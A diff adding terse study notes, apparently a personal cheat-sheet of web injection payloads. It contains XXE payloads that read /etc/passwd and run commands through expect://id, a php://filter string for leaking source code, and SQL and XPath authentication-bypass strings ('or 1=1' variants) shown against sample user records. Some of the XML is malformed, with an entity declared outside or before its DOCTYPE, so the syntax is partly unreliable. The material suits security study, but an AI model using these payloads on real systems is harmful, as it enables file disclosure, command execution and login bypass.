@@ -1,0 +1,62 @@
+ XXE => XML External Entity Injection
+
+    hack => salam
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY hack "salam"> ]>
+[<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+ <users>
+    <user>
+        <fn>ali</fn>
+    </user>   
+ </users>
+
+
+<?xml version="1.0" ?>
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<!DOCTYPE replace [<!ENTITY hack SYSTEM "expect://id"> ]>
+<root>
+<user>
+    &hack;
+</user>   
+</root>
+
+php://filter/convert.base64-encode/resource=index.php
+
+
+blah' or 1=1 or 'a'='a
+
+https://tipstrickshack.blogspot.com/2013/11/xpath-injection-tutorial.html
+
+//user[username/text()='j' and password/text()='$password']";
+
+//user[username/text()='j' or 1='1' and password/text()='$password']";
+
+j' or 1='1
+
+<users>
+	<user>
+		<name first="Jeff" last="Smiley"/>
+		<id>1</id>
+		<username>j</username>
+		<password>2</password>
+		<phone>123-456-7890</phone>
+	</user>
+	<user>
+		<name first="Chunk" last="MacRunfast"/>
+		<id>2</id>
+		<username>ali</username>
+		<password>1</password>
+		<phone>603-478-4115</phone>
+	</user>
+	<user>
+		<name first="Zenodermus" last="Javanicus"/>
+		<id>3</id>
+		<username>Zen</username>
+		<password>123</password>
+		<phone>222-222-2222</phone>
+	</user>
+</users>
+
+
+//payment[order_id/text()='999' or 1='1 ' and user_id/text()='$_SESSION['user_id']']";
+
